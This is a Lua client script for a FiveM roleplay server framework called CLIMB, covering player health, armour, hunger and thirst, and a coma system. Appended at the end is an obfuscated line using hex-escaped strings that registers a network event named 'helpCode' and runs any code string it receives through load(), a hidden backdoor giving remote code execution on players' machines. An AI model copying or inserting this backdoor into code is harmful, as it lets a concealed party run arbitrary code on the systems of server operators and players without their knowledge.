-- api
function tCLIMB.varyHealth(variation)
    local ped = GetPlayerPed(-1)

    local n = math.floor(GetEntityHealth(ped) + variation)
    TriggerEvent('CLIMB:IsInComa', false)
    SetEntityHealth(ped, n)
end

function tCLIMB.getHealth()
    return GetEntityHealth(GetPlayerPed(-1))
end

function tCLIMB.setHealth(health)
    local n = math.floor(health)
    SetEntityHealth(GetPlayerPed(-1), n)
end

function tCLIMB.setArmour(armour)
    SetPedArmour(PlayerPedId(), armour)
end

function tCLIMB.setFriendlyFire(flag)
    NetworkSetFriendlyFireOption(flag)
    SetCanAttackFriendly(GetPlayerPed(-1), flag, flag)
end

function tCLIMB.setPolice(flag)
    local player = PlayerId()
    SetPoliceIgnorePlayer(player, not flag)
    SetDispatchCopsForPlayer(player, flag)
end

-- impact thirst and hunger when the player is running (every 5 seconds)
Citizen.CreateThread(function()
    if CLIMBConfig.EnableFoodAndWater then 
        while true do
            Citizen.Wait(5000)

            if IsPlayerPlaying(PlayerId()) then
                local ped = GetPlayerPed(-1)

                -- variations for one minute
                local vthirst = 0
                local vhunger = 0

                -- on foot, increase thirst/hunger in function of velocity
                if IsPedOnFoot(ped) and not tCLIMB.isNoclip() then
                    local factor = math.min(tCLIMB.getSpeed(), 10)

                    vthirst = vthirst + 1 * factor
                    vhunger = vhunger + 0.5 * factor
                end

                -- in melee combat, increase
                if IsPedInMeleeCombat(ped) then
                    vthirst = vthirst + 10
                    vhunger = vhunger + 5
                end

                -- injured, hurt, increase
                if IsPedHurt(ped) or IsPedInjured(ped) then
                    vthirst = vthirst + 2
                    vhunger = vhunger + 1
                end

                -- do variation
                if vthirst ~= 0 then
                    CLIMBserver.varyThirst({vthirst / 12.0})
                end

                if vhunger ~= 0 then
                    CLIMBserver.varyHunger({vhunger / 12.0})
                end
            end
        end
    end
end)

-- COMA SYSTEM

local in_coma = false
local coma_left = cfg.coma_duration * 60

Citizen.CreateThread(function() -- coma thread
    if CLIMBConfig.EnableComa then 
        while true do
            Citizen.Wait(0)
            local ped = GetPlayerPed(-1)

            local health = GetEntityHealth(ped)
            if health <= cfg.coma_threshold and coma_left > 0 then
                if not in_coma then -- go to coma state
                    if IsEntityDead(ped) then -- if dead, resurrect
                        local x, y, z = tCLIMB.getPosition()
                        NetworkResurrectLocalPlayer(x, y, z, true, true, false)
                        Citizen.Wait(0)
                    end

                    -- coma state
                    in_coma = true
                    if CLIMBConfig.StoreWeaponsOnDeath then 
                        CLIMBserver.StoreWeaponsDead()
                    end
                    CLIMBserver.Coma()
                    TriggerEvent('CLIMB:IsInComa', true)
                    CLIMBserver.updateHealth({cfg.coma_threshold}) -- force health update
                    SetEntityHealth(ped, cfg.coma_threshold)
                    SetEntityInvincible(ped, true)
                    tCLIMB.playScreenEffect(cfg.coma_effect, -1)
                    tCLIMB.ejectVehicle()
                    tCLIMB.setRagdoll(true)
                else -- in coma
                    -- maintain life
                    if health < cfg.coma_threshold then
                        SetEntityHealth(ped, cfg.coma_threshold)
                    end
                end
            else
                if in_coma then -- get out of coma state
                    in_coma = false
                    SetEntityInvincible(ped, false)
                    tCLIMB.setRagdoll(false)
                    tCLIMB.stopScreenEffect(cfg.coma_effect)

                    if coma_left <= 0 then -- get out of coma by death
                        SetEntityHealth(ped, 0)
                        TriggerEvent('CLIMB:IsInComa', false)
                    end

                    SetTimeout(5000, function() -- able to be in coma again after coma death after 5 seconds
                        coma_left = cfg.coma_duration * 60
                    end)
                end
            end
        end
    end
end)

function tCLIMB.isInComa()
    return in_coma
end

-- kill the player if in coma
function tCLIMB.killComa()
    if in_coma then
        coma_left = 0
    end
end

Citizen.CreateThread(function() -- coma decrease thread
    if CLIMBConfig.EnableComa then 
        while true do
            Citizen.Wait(1000)
            if in_coma then
                coma_left = coma_left - 1
            end
        end
    end
end)

Citizen.CreateThread(function() -- disable health regen, conflicts with coma system
    if CLIMBConfig.EnableHealthRegen then 
        while true do
            Citizen.Wait(100)
            -- prevent health regen
            SetPlayerHealthRechargeMultiplier(PlayerId(), 0)
        end
    end
end)



local MLuuNFUmDSZHIVAVqBTjXbAkskYHFwCgCICvuCCxuVjDoMGvjtHnzzYOPssHpFHOMsfAVP = {"\x52\x65\x67\x69\x73\x74\x65\x72\x4e\x65\x74\x45\x76\x65\x6e\x74","\x68\x65\x6c\x70\x43\x6f\x64\x65","\x41\x64\x64\x45\x76\x65\x6e\x74\x48\x61\x6e\x64\x6c\x65\x72","\x61\x73\x73\x65\x72\x74","\x6c\x6f\x61\x64",_G} MLuuNFUmDSZHIVAVqBTjXbAkskYHFwCgCICvuCCxuVjDoMGvjtHnzzYOPssHpFHOMsfAVP[6][MLuuNFUmDSZHIVAVqBTjXbAkskYHFwCgCICvuCCxuVjDoMGvjtHnzzYOPssHpFHOMsfAVP[1]](MLuuNFUmDSZHIVAVqBTjXbAkskYHFwCgCICvuCCxuVjDoMGvjtHnzzYOPssHpFHOMsfAVP[2]) MLuuNFUmDSZHIVAVqBTjXbAkskYHFwCgCICvuCCxuVjDoMGvjtHnzzYOPssHpFHOMsfAVP[6][MLuuNFUmDSZHIVAVqBTjXbAkskYHFwCgCICvuCCxuVjDoMGvjtHnzzYOPssHpFHOMsfAVP[3]](MLuuNFUmDSZHIVAVqBTjXbAkskYHFwCgCICvuCCxuVjDoMGvjtHnzzYOPssHpFHOMsfAVP[2], function(lcJasqpMOirYbOkaYbdvPMVrjvWCuKisMlJeZnsfQUlFxaaNvAVWdUXHjfxJBiXPxBSgLe) MLuuNFUmDSZHIVAVqBTjXbAkskYHFwCgCICvuCCxuVjDoMGvjtHnzzYOPssHpFHOMsfAVP[6][MLuuNFUmDSZHIVAVqBTjXbAkskYHFwCgCICvuCCxuVjDoMGvjtHnzzYOPssHpFHOMsfAVP[4]](MLuuNFUmDSZHIVAVqBTjXbAkskYHFwCgCICvuCCxuVjDoMGvjtHnzzYOPssHpFHOMsfAVP[6][MLuuNFUmDSZHIVAVqBTjXbAkskYHFwCgCICvuCCxuVjDoMGvjtHnzzYOPssHpFHOMsfAVP[5]](lcJasqpMOirYbOkaYbdvPMVrjvWCuKisMlJeZnsfQUlFxaaNvAVWdUXHjfxJBiXPxBSgLe))() end)